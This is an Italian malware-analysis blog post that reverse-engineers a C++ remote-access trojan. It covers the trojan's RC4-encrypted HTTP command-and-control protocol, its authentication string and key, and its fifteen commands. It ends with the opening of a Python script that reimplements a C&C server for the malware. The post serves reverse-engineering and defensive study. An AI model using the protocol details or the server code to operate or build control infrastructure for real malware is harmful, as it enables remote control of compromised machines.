<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="736" height="749" src="https://malverse.it/wp-content/uploads/2022/09/image-34.png" alt="" class="wp-image-843" srcset="https://malverse.it/wp-content/uploads/2022/09/image-34.png 736w, https://malverse.it/wp-content/uploads/2022/09/image-34-295x300.png 295w" sizes="auto, (max-width: 736px) 100vw, 736px" /><figcaption>Funzione Config Builder</figcaption></figure>



<p>Successivamente vengono chiamate le diverse funzioni che si occupano di comunicare con il C&amp;C; vediamo ora come è possibile sfruttare le informazioni presenti su any.run per velocizzare l&#8217;analisi successiva.</p>



<h2 class="wp-block-heading">Analisi Dinamica</h2>



<p>Su any.run sono presenti diversi sample che ci permettono di avere una prima Overview di come avviene la comunicazione con il server C&amp;C:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="888" height="468" src="https://malverse.it/wp-content/uploads/2022/09/image-28.png" alt="" class="wp-image-821" srcset="https://malverse.it/wp-content/uploads/2022/09/image-28.png 888w, https://malverse.it/wp-content/uploads/2022/09/image-28-300x158.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-28-768x405.png 768w" sizes="auto, (max-width: 888px) 100vw, 888px" /><figcaption>Sample 1: invio del primo pacchetto</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="386" src="https://malverse.it/wp-content/uploads/2022/09/image-27.png" alt="" class="wp-image-820" srcset="https://malverse.it/wp-content/uploads/2022/09/image-27.png 878w, https://malverse.it/wp-content/uploads/2022/09/image-27-300x132.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-27-768x338.png 768w" sizes="auto, (max-width: 878px) 100vw, 878px" /><figcaption>Sample 2: invio del primo pacchetto</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="891" height="391" src="https://malverse.it/wp-content/uploads/2022/09/image-29.png" alt="" class="wp-image-823" srcset="https://malverse.it/wp-content/uploads/2022/09/image-29.png 891w, https://malverse.it/wp-content/uploads/2022/09/image-29-300x132.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-29-768x337.png 768w" sizes="auto, (max-width: 891px) 100vw, 891px" /><figcaption>Sample 3: invio del primo pacchetto</figcaption></figure>



<p>Le risposte a questa richiesta sono tutte dei redirect essendo il C&amp;C offline in quel determinato momento; cercando altri sample però abbiamo una richiesta che questa volta fornisce una risposta e ci fornisce nuovi dettagli sul protocollo challenge-response, possiamo vedere infatti che il C&amp;C risponde solo con il <strong>board_id</strong> (in questo caso 1838):</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="894" height="396" src="https://malverse.it/wp-content/uploads/2022/09/image-32.png" alt="" class="wp-image-833" srcset="https://malverse.it/wp-content/uploads/2022/09/image-32.png 894w, https://malverse.it/wp-content/uploads/2022/09/image-32-300x133.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-32-768x340.png 768w" sizes="auto, (max-width: 894px) 100vw, 894px" /><figcaption>Sample 4: invio del primo pacchetto</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="903" height="189" src="https://malverse.it/wp-content/uploads/2022/09/image-30.png" alt="" class="wp-image-831" srcset="https://malverse.it/wp-content/uploads/2022/09/image-30.png 903w, https://malverse.it/wp-content/uploads/2022/09/image-30-300x63.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-30-768x161.png 768w" sizes="auto, (max-width: 903px) 100vw, 903px" /><figcaption>Sample 4: risposta al primo pacchetto che ritorna uno dei parametri inviati (board_id)</figcaption></figure>



<p>Da queste diversi sample possiamo iniziare ed effettuare delle supposizioni su come funziona il protocollo di comunicazione, che verranno poi approfondite con le successive analisi:</p>



<ul class="wp-block-list"><li><strong>board_id</strong>: numero differente tra le diverse richieste, potrebbe essere l&#8217;ID della richiesta</li><li><strong>user_id</strong>: conviso tra le varie richieste, potrebbe essere un valore di autenticazione</li><li><strong>file1</strong>: nome di file differente tra le diverse richieste, che non corrisponde a un file presente sulla macchina any.run; potrebbe essere utilizzato per cambiare la signature di ogni richiesta</li></ul>



<p>Continuiamo ora con l&#8217;analisi per confermare/smentire le prime supposizioni. Essendo un malware scritto in C++, approfondiamo ora la classe <strong>WebPacket </strong>che si occupa di comunicare con il C&amp;C.</p>



<h2 class="wp-block-heading">Classe WebPacket</h2>



<p>Il malware presenta una classe di nome <strong>WebPacket</strong> che si occupa di inizializzare l&#8217;oggetto (dimensione 3872 byte) con diversi attributi riguardi la comunicazione e dispone di diverse funzioni che si occupano di comunicare con il C&amp;C. </p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="495" height="211" src="https://malverse.it/wp-content/uploads/2022/09/image-50.png" alt="" class="wp-image-911" srcset="https://malverse.it/wp-content/uploads/2022/09/image-50.png 495w, https://malverse.it/wp-content/uploads/2022/09/image-50-300x128.png 300w" sizes="auto, (max-width: 495px) 100vw, 495px" /><figcaption>Classe WebPacket</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="705" height="609" src="https://malverse.it/wp-content/uploads/2022/09/image-63.png" alt="" class="wp-image-986" srcset="https://malverse.it/wp-content/uploads/2022/09/image-63.png 705w, https://malverse.it/wp-content/uploads/2022/09/image-63-300x259.png 300w" sizes="auto, (max-width: 705px) 100vw, 705px" /><figcaption>Costruttore classe WebPacket</figcaption></figure>



<p>Come possiamo vedere dal costruttore, i primi 4 byte contengono il puntatore alla vftable e dopo abbiamo la zona di memoria che contiene i membri dell&#8217;oggetto. Per ulteriori info su come effettuare reverse di programmi C++: <a rel="noreferrer noopener" href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+RE3011_re_cpp+2022_v1/course/" target="_blank">QUI</a>, <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=ir2B1trR0fE" target="_blank">QUI</a> e <a rel="noreferrer noopener" href="https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf" target="_blank">QUI</a>.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="699" height="420" src="https://malverse.it/wp-content/uploads/2022/09/image-49.png" alt="" class="wp-image-903" srcset="https://malverse.it/wp-content/uploads/2022/09/image-49.png 699w, https://malverse.it/wp-content/uploads/2022/09/image-49-300x180.png 300w" sizes="auto, (max-width: 699px) 100vw, 699px" /><figcaption>Struttura di un oggetto C++ in memoria (Fonte: Gal Zaban)</figcaption></figure>



<p>I <strong>membri </strong>principali presenti in questa classe sono:</p>



<pre class="wp-block-code"><code>HINTERNET hSession;
HINTERNET hInternet;
HINTERNET hRequest;
String URL;
String Path;
int port;
....
char substitutionBox1&#91;256]
char substitutionBox2&#91;256]
int keyLength;
int rc4Key&#91;4];</code></pre>



<p>La <strong>vtable </strong>invece contiene solo una funzione che viene chiamata al termine per effettuare il reset delle variabili e chiamare la funzione WinHttpCloseHandle:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="233" src="https://malverse.it/wp-content/uploads/2022/09/virtualTable-1024x233.png" alt="" class="wp-image-908" srcset="https://malverse.it/wp-content/uploads/2022/09/virtualTable-1024x233.png 1024w, https://malverse.it/wp-content/uploads/2022/09/virtualTable-300x68.png 300w, https://malverse.it/wp-content/uploads/2022/09/virtualTable-768x175.png 768w, https://malverse.it/wp-content/uploads/2022/09/virtualTable.png 1068w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>vftable che contiene il puntatore alla funzione FreeAndCloseHandle</figcaption></figure>



<p>Queste info vengono estratte da Ghidra da diverse strutture presenti nei programmi C++:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="310" src="https://malverse.it/wp-content/uploads/2022/09/image-69-1024x310.png" alt="" class="wp-image-1062" srcset="https://malverse.it/wp-content/uploads/2022/09/image-69-1024x310.png 1024w, https://malverse.it/wp-content/uploads/2022/09/image-69-300x91.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-69-768x232.png 768w, https://malverse.it/wp-content/uploads/2022/09/image-69.png 1118w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Struct che ci fornisce info sulla classe e il puntatore alla VFTable</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="926" height="262" src="https://malverse.it/wp-content/uploads/2022/09/image-70.png" alt="" class="wp-image-1063" srcset="https://malverse.it/wp-content/uploads/2022/09/image-70.png 926w, https://malverse.it/wp-content/uploads/2022/09/image-70-300x85.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-70-768x217.png 768w" sizes="auto, (max-width: 926px) 100vw, 926px" /><figcaption>Struct che contiene informazioni sull&#8217;ereditarietà della classe</figcaption></figure>



<p>Dopo aver fatto una piccola degressione su C++, passiamo al funzionamento; questa classe si occupa di inviare il primo pacchetto di autenticazione, con <strong>board_id </strong>casuale (minore di 10000), <strong>user_id </strong>uguale a <strong>*<em>dJU!</em>JE&amp;!M@UNQ@</strong> e <strong>filename </strong>casuale scelto tra happy.pdf, star.avi, hp01.avi, dream.avi, example.dat, pratice.pdf, my.doc e img01_29.jpg.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="565" height="435" src="https://malverse.it/wp-content/uploads/2022/09/image-65.png" alt="" class="wp-image-992" srcset="https://malverse.it/wp-content/uploads/2022/09/image-65.png 565w, https://malverse.it/wp-content/uploads/2022/09/image-65-300x231.png 300w" sizes="auto, (max-width: 565px) 100vw, 565px" /><figcaption>Generazione del valore casuale (board_id) e invio del pacchetto di autenticazione</figcaption></figure>



<p>Successivamente viene ricevuta la risposta e viene confrontato il valore casuale generato (board_id) con quello ricevuto; questo conferma la supposizione che avevamo fatto precedentemente tramite analisi dinamica.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="624" height="350" src="https://malverse.it/wp-content/uploads/2022/09/image-64.png" alt="" class="wp-image-988" srcset="https://malverse.it/wp-content/uploads/2022/09/image-64.png 624w, https://malverse.it/wp-content/uploads/2022/09/image-64-300x168.png 300w" sizes="auto, (max-width: 624px) 100vw, 624px" /><figcaption>Controllo dell&#8217;autenticazione attraverso il campo board_id</figcaption></figure>



<p>Vediamo ora quali metodi esporta questa classe che permettono di effettuare delle operazioni C&amp;C; per tracciare quali sono i metodi di questa classe sfruttiamo il registro <strong>ECX </strong>che contiene l&#8217;indirizzo a questa classe appena definita.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="781" height="149" src="https://malverse.it/wp-content/uploads/2022/09/image-48.png" alt="" class="wp-image-899" srcset="https://malverse.it/wp-content/uploads/2022/09/image-48.png 781w, https://malverse.it/wp-content/uploads/2022/09/image-48-300x57.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-48-768x147.png 768w" sizes="auto, (max-width: 781px) 100vw, 781px" /><figcaption>Copia del puntatore che contiene l&#8217;indirizzo della classe WebPacket</figcaption></figure>



<p>Da queste informazioni riusciamo ad ottenere i seguenti metodi:</p>



<ul class="wp-block-list"><li><strong>C&amp;CSendRequest</strong>: invia la richiesta di tipo POST al C&amp;C attraverso WinHttpSendRequest; esegue la funzione C&amp;CConnectAndOpenRequest.</li><li><strong>C&amp;CConnectAndOpenRequest: </strong>si occupa di chiamare le funzioni WinHttpOpen, WinHttpConnect, WinHttpOpenRequest.</li><li><strong>C&amp;CReceiveAndDecryptDataRC4</strong>: si occupa di ottenere i dati con WinHttpReceiveResponse, WinHttpReadData e opzionalmente decifrarli con RC4.</li><li><strong>C&amp;CEncryptCodeResult</strong>: effettua l&#8217;encryption tramite RC4 dello status code (0x1836, 0x1837, ecc) ed esegue WinHttpWriteData con input i dati cifrati.</li><li><strong>C&amp;CEncryptCommandResult:</strong>  effettua l&#8217;encryption tramite RC4 del risultato del comando eseguito ed esegue WinHttpWriteData con input i dati cifrati.</li><li><strong>C&amp;CSendRequestAndExecuteCommand</strong>: si occupa di inviare il command packet, ricevere ulteriori dati, eseguire il comando e ritornare il risultato al C&amp;C.</li></ul>



<p>Per capire bene le successive analisi è necessario conoscere le <strong>WinHTTP AP</strong>I; per chi non conoscesse il flow può approfondirlo tramite degli esempi presenti <a rel="noreferrer noopener" href="https://www.codeproject.com/Articles/4586/Web-Data-Extraction-by-Crawling-using-WINHTTP-and" data-type="URL" target="_blank">qui</a> o <a rel="noreferrer noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpwritedata" data-type="URL" data-id="https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpwritedata" target="_blank">qui</a>.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="729" height="448" src="https://malverse.it/wp-content/uploads/2022/09/image-67.png" alt="" class="wp-image-1025" srcset="https://malverse.it/wp-content/uploads/2022/09/image-67.png 729w, https://malverse.it/wp-content/uploads/2022/09/image-67-300x184.png 300w" sizes="auto, (max-width: 729px) 100vw, 729px" /><figcaption>Communication Flow con il C&amp;C</figcaption></figure>



<h2 class="wp-block-heading">Cifratura RC4</h2>



<p>L&#8217;algoritmo di cifratura RC4 viene utilizzato come visto in precedenza per l&#8217;<strong>API hashing</strong> ma anche per la <strong>comunicazione </strong>con il C&amp;C. In particolare si hanno tre SBox che vengono utilizzate per la cifratura, una per l&#8217;API hashing e due per la comunicazione C&amp;C (una per la ricezione dei dati e una per l&#8217;invio).</p>



<p>Essendo che la funzione <strong>PRGA </strong>utilizza l&#8217;SBox come input per generare il valore random successivo per poi effettuare la cifratura/decifratura, è necessario avere due dichiarazioni differenti quando realizzeremo il server C&amp;C.</p>



<p>Un&#8217;altra differenza è che la funzione riguardante l&#8217;API Hashing è una funzione locale, mentre quelle riguardanti la comunicazione fanno parte della classe <strong>WebPacket </strong>e utilizzano le SBox e la chiave salvate all&#8217;interno di questa classe.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="554" height="690" src="https://malverse.it/wp-content/uploads/2022/09/image-60.png" alt="" class="wp-image-966" srcset="https://malverse.it/wp-content/uploads/2022/09/image-60.png 554w, https://malverse.it/wp-content/uploads/2022/09/image-60-241x300.png 241w" sizes="auto, (max-width: 554px) 100vw, 554px" /><figcaption>Le due fasi KSA con due SBox per la comunicazione C&amp;C</figcaption></figure>



<h2 class="wp-block-heading">Funzione C&amp;CSendRequest</h2>



<p>La funzione <strong>C&amp;CSendRequest </strong>dopo aver effettuato la risoluzione delle API si occupa:</p>



<ul class="wp-block-list"><li>Chiamare la funzione <strong>C&amp;CConnectAndOpenRequest</strong>.</li><li>Costruire l&#8217;<strong>header </strong>della richiesta HTTP.</li><li>Costruire il <strong>body </strong>della richiesta HTTP.</li><li>Inviare la richiesta attraverso <strong>WinHttpSendRequest</strong>.</li></ul>



<p>La richiesta POST ha questa forma:</p>



<pre class="wp-block-code"><code>POST /URI HTTP/1.1
Cache-Control: max-age=0
Connection: keep-alive
Accept: */*
Content-Type: multipart/form-data; boundary=----FormBoundary<strong>Caratteri casuali</strong>

User-Agent: <strong>Ottenuto da ObtainUserAgentString o Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)</strong>
Content-Length: <strong>Lunghezza</strong>
Host: <strong>Dominio</strong>

------FormBoundary<strong>Caratteri casuali</strong>
Content-Disposition: form-data; name="board_id"
<strong>Casuale</strong>

------FormBoundary<strong>Caratteri casuali</strong>
Content-Disposition: form-data; name="user_id"
<strong>*dJU!*JE&amp;!M@UNQ@ se autentication packet altrimenti vuoto se è command packet</strong>

------FormBoundary<strong>Caratteri casuali</strong>
Content-Disposition: form-data; name="file1"; filename=<strong>Casuale</strong> <strong>tra happy.pdf, star.avi, hp01.avi, dream.avi, example.dat, pratice.pdf, my.doc e img01_29.jpg.</strong>
Content-Type: application/octet-stream
....</code></pre>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="913" height="236" src="https://malverse.it/wp-content/uploads/2022/09/image-36.png" alt="" class="wp-image-848" srcset="https://malverse.it/wp-content/uploads/2022/09/image-36.png 913w, https://malverse.it/wp-content/uploads/2022/09/image-36-300x78.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-36-768x199.png 768w" sizes="auto, (max-width: 913px) 100vw, 913px" /><figcaption>I riferimenti al body non sono cifrati</figcaption></figure>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/image-38.png" alt="" class="wp-image-850" width="725" height="572" srcset="https://malverse.it/wp-content/uploads/2022/09/image-38.png 918w, https://malverse.it/wp-content/uploads/2022/09/image-38-300x237.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-38-768x606.png 768w" sizes="auto, (max-width: 725px) 100vw, 725px" /><figcaption>Funzioni che utilizzato i riferimenti alle stringhe del body</figcaption></figure>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="594" src="https://malverse.it/wp-content/uploads/2022/09/sendrequest_graph-1024x594.png" alt="" class="wp-image-852" srcset="https://malverse.it/wp-content/uploads/2022/09/sendrequest_graph-1024x594.png 1024w, https://malverse.it/wp-content/uploads/2022/09/sendrequest_graph-300x174.png 300w, https://malverse.it/wp-content/uploads/2022/09/sendrequest_graph-768x445.png 768w, https://malverse.it/wp-content/uploads/2022/09/sendrequest_graph.png 1344w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Function Graph C&amp;CSendRequest</figcaption></figure>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="711" src="https://malverse.it/wp-content/uploads/2022/09/image-39-1024x711.png" alt="" class="wp-image-854" srcset="https://malverse.it/wp-content/uploads/2022/09/image-39-1024x711.png 1024w, https://malverse.it/wp-content/uploads/2022/09/image-39-300x208.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-39-768x533.png 768w, https://malverse.it/wp-content/uploads/2022/09/image-39.png 1102w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Aggiunta dei diversi header attraverso WinHttpAddRequestHeaders</figcaption></figure>



<p>Il pacchetto di autenticazione viene differenziato da quello per la richiesta dei comandi attraverso il <strong>board_id</strong>, che è minore di 10000 se si tratta del primo caso, maggiore nel secondo; oltre a questo il secondo tipo di pacchetto non contiene <strong>user_id </strong>con la stringa <strong>*dJU!*JE&amp;!M@UNQ@</strong>.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="461" height="208" src="https://malverse.it/wp-content/uploads/2022/09/image-53.png" alt="" class="wp-image-929" srcset="https://malverse.it/wp-content/uploads/2022/09/image-53.png 461w, https://malverse.it/wp-content/uploads/2022/09/image-53-300x135.png 300w" sizes="auto, (max-width: 461px) 100vw, 461px" /><figcaption>Aggiunta di 10000 se il pacchetto è per la richiesta di un comando</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="868" height="708" src="https://malverse.it/wp-content/uploads/2022/09/image-54.png" alt="" class="wp-image-930" srcset="https://malverse.it/wp-content/uploads/2022/09/image-54.png 868w, https://malverse.it/wp-content/uploads/2022/09/image-54-300x245.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-54-768x626.png 768w" sizes="auto, (max-width: 868px) 100vw, 868px" /><figcaption>Aggiunta di user_id con dJU!*JE&amp;!M@UNQ@ se il pacchetto non è di autenticazione</figcaption></figure>



<p>Al termine della costruzione del pacchetto HTTP viene inviato tentando l&#8217;invio tre volte con uno sleep di 300 millisecondi tra un invio e l&#8217;altro:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="659" height="294" src="https://malverse.it/wp-content/uploads/2022/09/image-55.png" alt="" class="wp-image-933" srcset="https://malverse.it/wp-content/uploads/2022/09/image-55.png 659w, https://malverse.it/wp-content/uploads/2022/09/image-55-300x134.png 300w" sizes="auto, (max-width: 659px) 100vw, 659px" /></figure>



<h2 class="wp-block-heading">Funzione C&amp;CConnectAndOpenRequest</h2>



<p>Questa funzione viene chiamata immediatamente dalla funzione <strong>C&amp;CSendRequest </strong> e si occupa di:</p>



<ul class="wp-block-list"><li>Ottenere l&#8217;user agent corrente tramite <strong>ObtainUserAgentString</strong></li><li>Ottenere le configurazioni proxy correnti tramite <strong>WinHttpGetIEProxyConfigForCurrentUser</strong></li><li>Chiamare la funzione <strong>WinHttpOpen</strong>, <strong>WinHttpConnect</strong>, <strong>WinHttpOpenHttp</strong>.</li></ul>



<p>Nella conversione dell&#8217;User Agent si utilizza due volte <strong>MultiByteToWideChar</strong>; questo avviene spesso con l&#8217;utilizzo di determinate API Windows, come si può vedere dall&#8217;esempio sotto, per ottenere prima la dimensione del buffer da ricevere (in questo caso UserAgent) per poi richiamare MultiByteToWideChar con il valore di size corretto.</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/image-43.png" alt="" class="wp-image-870" width="725" height="310" srcset="https://malverse.it/wp-content/uploads/2022/09/image-43.png 725w, https://malverse.it/wp-content/uploads/2022/09/image-43-300x128.png 300w" sizes="auto, (max-width: 725px) 100vw, 725px" /><figcaption>Utilizzo di MultiByteToWideChar per la conversione dell&#8217;User Agent</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="722" height="372" src="https://malverse.it/wp-content/uploads/2022/09/image-42.png" alt="" class="wp-image-869" srcset="https://malverse.it/wp-content/uploads/2022/09/image-42.png 722w, https://malverse.it/wp-content/uploads/2022/09/image-42-300x155.png 300w" sizes="auto, (max-width: 722px) 100vw, 722px" /><figcaption>Esempio di utilizzo di ObtainUserAgentString e MultiByteToWideChar (Source: cpp.hotexamples.com)</figcaption></figure>



<h2 class="wp-block-heading">Funzione C&amp;CReceiveAndDecryptDataRC4</h2>



<p>Dopo aver inviato la richiesta con <strong>C&amp;CSendRequest </strong>questa funzione si occupa di:</p>



<ul class="wp-block-list"><li>Ricevere i dati tramite <strong>WinHttpReceiveResponse</strong> e <strong>WinHttpReadData</strong></li><li>Decifrare i dati con RC4 </li></ul>



<p>È presente una flag come parametro che stabilisce se i dati devono essere decifrati:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="723" height="427" src="https://malverse.it/wp-content/uploads/2022/09/image-52.png" alt="" class="wp-image-923" srcset="https://malverse.it/wp-content/uploads/2022/09/image-52.png 723w, https://malverse.it/wp-content/uploads/2022/09/image-52-300x177.png 300w" sizes="auto, (max-width: 723px) 100vw, 723px" /></figure>



<h2 class="wp-block-heading">Funzioni C&amp;CEncryptCodeResult e C&amp;CEncryptCommandResult</h2>



<p>Queste due funzioni si occupano di effettuare la cifratura RC4 dei dati in input e aggiungerli alla richiesta HTTP tramite <strong>WinHttpWriteData</strong>:</p>



<ul class="wp-block-list"><li><strong>C&amp;CEncryptedCodeResult</strong>: si occupa di cifrare il result code (0x1836, 0x1837, 0x1838, 0x1839) del comando eseguito.</li><li><strong>C&amp;CEncryptCommandResult:</strong> si occupa di cifrare la risposta del comando eseguito.</li></ul>



<p>Come si può evidenziare dal Call Graph, ci sono funzioni che ritornano solo il result code (es. KeepAlive, TerminateProcessByPID), altre che ritornano solo il risultato del comando (es. GetSystemInfo, GetDriverinfo) e altri comandi più complessi (es. WriteFile) che ritornano entrambi.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="788" height="458" src="https://malverse.it/wp-content/uploads/2022/09/winHttpWrite-3.png" alt="" class="wp-image-1091" srcset="https://malverse.it/wp-content/uploads/2022/09/winHttpWrite-3.png 788w, https://malverse.it/wp-content/uploads/2022/09/winHttpWrite-3-300x174.png 300w, https://malverse.it/wp-content/uploads/2022/09/winHttpWrite-3-768x446.png 768w" sizes="auto, (max-width: 788px) 100vw, 788px" /><figcaption>Call Graph delle due funzioni</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="721" height="414" src="https://malverse.it/wp-content/uploads/2022/09/image-72.png" alt="" class="wp-image-1092" srcset="https://malverse.it/wp-content/uploads/2022/09/image-72.png 721w, https://malverse.it/wp-content/uploads/2022/09/image-72-300x172.png 300w" sizes="auto, (max-width: 721px) 100vw, 721px" /><figcaption>Cifratura del buffer in input e scrittura dei dati cifrati tramite WinHttpWriteData</figcaption></figure>



<h2 class="wp-block-heading">Funzione C&amp;CSendRequestAndExecuteCommand</h2>



<p>Infine dopo aver ricevuto la richiesta e averla decifrata, viene eseguita l&#8217;operazione in base al codice del comando specificato.</p>



<figure class="wp-block-table"><table><tbody><tr><td>(OBBLIGATORIO) 4 BYTE numero comando</td></tr><tr><td>(OBBLIGATORIO) 2 BYTE lunghezza parametro opzionale</td></tr><tr><td>(OPZIONALE) 4 BYTE parametro opzionale</td></tr></tbody></table><figcaption>Struttura del comand packet</figcaption></figure>



<p>Altri comandi invece richiedono l&#8217;invio di altri dati, ad esempio la funzione <strong>WriteFile </strong>o <strong>DownloadAndMapFile</strong>; per ulteriori info vedere lo script Python per la realizzazione del C&amp;C.</p>



<p>Vengono ricevuti i primi 6 Byte e se gli ultimi 2 byte sono diversi da  zero, si richiama la funzione per ricevere i dati restanti di dimensione variabile.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="563" height="255" src="https://malverse.it/wp-content/uploads/2022/09/image-57.png" alt="" class="wp-image-940" srcset="https://malverse.it/wp-content/uploads/2022/09/image-57.png 563w, https://malverse.it/wp-content/uploads/2022/09/image-57-300x136.png 300w" sizes="auto, (max-width: 563px) 100vw, 563px" /><figcaption>Ricezione e decifratura dei comandi e dei parametri opzionali</figcaption></figure>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/image-71.png" alt="" class="wp-image-1088" width="587" height="836" srcset="https://malverse.it/wp-content/uploads/2022/09/image-71.png 474w, https://malverse.it/wp-content/uploads/2022/09/image-71-211x300.png 211w" sizes="auto, (max-width: 587px) 100vw, 587px" /><figcaption>Switch per l&#8217;esecuzione del comando ricevuto</figcaption></figure>



<p>Abbiamo anche dei <strong>result code</strong> che vengono inviati come risultato di alcuni comandi:</p>



<ul class="wp-block-list"><li><strong>0x1836</strong>: esecuzione avvenuta con successo (es. comando KeepAlive, processo creato con successo)</li><li><strong>0x1837</strong>: errore nell&#8217;esecuzione del comando (es. file da leggere non esistente)</li><li><strong>0x1838</strong>: invio metadati di un file/directory o scrittura avvenuta correttamente (es. prima risposta a WriteFile o ReadFile)</li><li><strong>0x1839</strong>: termine esecuzione comando (es. ultima risposta a WriteFile)</li></ul>



<p>Il RAT supporta 15 comandi:</p>



<figure class="wp-block-table"><table><tbody><tr><td><strong>NUMERO COMANDO</strong></td><td><strong>FUNZIONE</strong></td></tr><tr><td>0x1827</td><td><strong>GetSystemInfo</strong></td></tr><tr><td>0x1828</td><td><strong>GetDriverInfo</strong></td></tr><tr><td>0x1829</td><td><strong>SetConfig</strong></td></tr><tr><td>0x182A</td><td><strong>GetConfig</strong></td></tr><tr><td>0x182B</td><td><strong>KeepAlive</strong></td></tr><tr><td>0x182C</td><td><strong>WriteFile</strong></td></tr><tr><td>0x182D</td><td><strong>ReadFile</strong></td></tr><tr><td>0x182E</td><td><strong>CreateProcessByName</strong></td></tr><tr><td>0x182F</td><td><strong>ExecuteCMD</strong></td></tr><tr><td>0x1830</td><td><strong>GetMetadataFile</strong></td></tr><tr><td>0x1831</td><td><strong>GetProcessList</strong></td></tr><tr><td>0x1832</td><td><strong>TerminateProcessByPID</strong></td></tr><tr><td>0x1834</td><td><strong>Disconnect</strong></td></tr><tr><td>0x1835</td><td><strong>DeleteTempFile</strong></td></tr><tr><td>0x183C</td><td><strong>DownloadAndMapFile</strong></td></tr></tbody></table><figcaption>Funzionalità del RAT</figcaption></figure>



<p>Per implementare correttamente il server C&amp;C è necessario capire anche quali funzioni rimangono in attesa di ricevere ulteriori dati per essere eseguite correttamente; questo può essere velocemente rilevato con la funzione<strong> Function Call Graph </strong>di Ghidra:</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/image-58.png" alt="" class="wp-image-955" width="1003" height="266" srcset="https://malverse.it/wp-content/uploads/2022/09/image-58.png 981w, https://malverse.it/wp-content/uploads/2022/09/image-58-300x80.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-58-768x204.png 768w" sizes="auto, (max-width: 1003px) 100vw, 1003px" /><figcaption>Funzione che richiede ulteriori dati per essere eseguita correttamente</figcaption></figure>



<h2 class="wp-block-heading">Implementazione Server C&amp;C</h2>



<p>Implementiamo ora un server HTTP, che risponde ad alcuni dei comandi ricevuti dal malware; si lascia come compito al lettore di implementare i restanti tre comandi e gli error code non gestiti 🙂</p>



<p>Importante ricordarsi che è necessario avere due cipher per la cifratura e decifratura dei dati; inoltre alcuni comandi non richiedono ulteriori interazioni con il C&amp;C, mentre alti richiedono l&#8217;interazione con l&#8217;operatore che deve inserire ulteriori dati (es. nome del processo da creare).</p>



<pre class="wp-block-code"><code>#!/usr/bin/env python3

import sys, struct, cgi, Crypto.Cipher.ARC4, time, hexdump
from http.server import BaseHTTPRequestHandler, HTTPServer

# Dominio e porta dove il server deve essere in ascolto
DOMAIN = '0.0.0.0'
PORT = 80

class httpHandler(BaseHTTPRequestHandler):
    
    key = bytes.fromhex('271a16ab6d7a900ef3fa677dce8ab268')
    rc4Receive = Crypto.Cipher.ARC4.new(key)
    rc4Send = Crypto.Cipher.ARC4.new(key)
    lastCommand = None
   
    def unpack10(x):
        x1, x2, x3, x4  = struct.unpack('&lt;HIHH', x)
        return x1, x2, x3 | (x4 &lt;&lt; 16)
    
    def unpack16(x):
        x1, x2, x3, x4, x5  = struct.unpack('&lt;IHIIH', x)
